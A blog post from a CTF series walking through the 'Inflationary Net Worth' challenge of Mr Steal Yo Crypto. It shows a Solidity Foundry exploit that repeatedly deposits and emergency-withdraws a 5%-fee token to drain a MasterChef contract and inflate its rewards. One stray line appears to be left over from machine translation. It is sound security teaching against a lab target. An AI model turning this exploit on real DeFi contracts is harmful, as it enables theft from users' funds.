---
title: "Mr Steal Yo Crypto — Inflationary Net Worth"
date: 2023-07-22
draft: false
description: "CTF - 9"
tags: ["CTF"]
series: ["CTF"]
series_order: 9
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #9 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real-world exploits.

> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Inflationary Net Worth

There’s a MasterChef contract which accepts MULA tokens and mints MUNY as rewards to stakers.

MULA has a deflationary transfer tax mechanism which burns 5% of each transfer, in order to properly incentivize long-term holders.

Your task is to trick MasterChef into minting you all of the MUNY allocated to all stakers. You start with 10,000 MULA.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/inflationary-net-worth)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/9-inflationary-net-worth.sol)

### Review of the contracts

#### MulaToken.sol

This is a basic ERC20 contract except for the fact that there is a fee of 5% per transfer. I think this will be one of the factors for the exploit.

```solidity
/// @dev transferFrom with a 5% transfer tax
function transferFrom(
    address from,
    address to,
    uint256 amount
) public override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);

    uint256 tax = amount * 5 / 100;
    _burn(from, tax);

    _transfer(from, to, amount - tax);
    return true;
}

/// @dev transfer with a 5% transfer tax
function transfer(address to, uint256 amount) public override returns (bool) {
    address owner = _msgSender();

    uint256 tax = amount * 5 / 100;
    _burn(owner, tax);

    _transfer(owner, to, amount - tax);
    return true;
}
```

Sure! Here's the translated content with the code blocks in Markdown format:

#### MasterChef.sol

I will only make a few comments on some parts of the code that are useful for the exploit:

- `deposit()`: This function will be used to mint the MUNY token (as seen in the test file at [L130](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/9-inflationary-net-worth.sol#L130)). The variable `user.rewardDebt` blocks us from claiming the MUNY in the same block as the deposit().

- `withdraw()`:

```solidity
// Deposit LP tokens to MasterChef for MUNY allocation.
function deposit(uint256 _pid, uint256 _amount) public {
    PoolInfo storage pool = poolInfo[_pid];
    UserInfo storage user = userInfo[_pid][msg.sender];
    updatePool(_pid);
    if (user.amount > 0) {
        uint256 pending = user.amount.mul(pool.accMunyPerShare).div(1e12).sub(user.rewardDebt);
        safeMunyTransfer(msg.sender, pending);
    }
    pool.lpToken.safeTransferFrom(address(msg.sender), address(this), _amount);
    user.amount = user.amount.add(_amount);
    user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);
    emit Deposit(msg.sender, _pid, _amount);
}

// Withdraw without caring about rewards. EMERGENCY ONLY.
function emergencyWithdraw(uint256 _pid) public {
    PoolInfo storage pool = poolInfo[_pid];
    UserInfo storage user = userInfo[_pid][msg.sender];
    pool.lpToken.safeTransfer(address(msg.sender), user.amount);
    emit EmergencyWithdraw(msg.sender, _pid, user.amount);
    user.amount = 0;
    user.rewardDebt = 0;
}
```

### Exploit the Vulnerability

Honestly, I didn't know where to start because we "only" need to mint all of the MUNY allocated to all stakers. Before minting all the MUNY allocated, we need to have our balance of MulaToken (= `user.amount`) greater than the balance of MulaToken of the MasterChef contract. For the moment, it's logical if we want to mint all the MUNY.

But how can I do that? At first, the update of `user.amount` was correct for me. Then I remembered that the MulaToken has a 5% fee per transfer, but the contract does not take this parameter into account.

```solidity
// solves the challenge

function testChallengeExploit() public {
    vm.startPrank(attacker, attacker);

    // implement solution here
    // Inside deposit() our balance (user.amount) is increased by _amount
    // However, the token is deflationary, burning 5% of the amount per swap:
    // If we send 10_000e18 in reality, MasterChef will receive 9_500e18 but our balance is increased by 10_000e18
    // So we will be able to withdraw 10_000e18 to MasterChef and we will receive 9_500e18
    // During this operation, the balance of MasterChef will lose 500e18

    // Loop for decreasing the lpSupply inside MasterChef until we are not able to withdraw our amount deposited
    bool first = true;
    uint count;
    uint amount;

    while (mula.balanceOf(address(masterChef)) > amount || first) {
        if (first) {
            first = false;
        } else {
            masterChef.emergencyWithdraw(0);
            console.log("balance attacker - withdraw: ", mula.balanceOf(address(attacker)));
            console.log("balance masterChef - withdraw: ", mula.balanceOf(address(masterChef)));
        }
        amount = mula.balanceOf(address(attacker));
        console.log("amount : ", amount);
        masterChef.deposit(0, mula.balanceOf(address(attacker)));
        ++count;
        console.log("count : ", count);
        console.log("balance attacker - deposit: ", mula.balanceOf(address(attacker)));
        console.log("balance masterChef - deposit: ", mula.balanceOf(address(masterChef)));
    }

    // Here we are not able to withdraw the amount deposited because user.amount > lpSupply
    console.log("balance attacker : ", mula.balanceOf(address(attacker)));
    console.log("balance masterChef : ", mula.balanceOf(address(masterChef)));

    // Withdraw all the lpSupply in order to manipulate pool.accMunyPerShare and be able to claim all the fees after that
    masterChef.withdraw(0, mula.balanceOf(address(masterChef)) - 1);
    console.log("balance masterChef : ", mula.balanceOf(address(masterChef)), "balance user.amount : ", amount - (mula.balanceOf(address(masterChef)) - 1));

    vm.stopPrank();
    validation();
}
```

This challenge was interesting. It taught me to be more careful with variable updates related to token transfers.

Here is the [test file](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/9-inflationary-net-worth.sol).

### Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.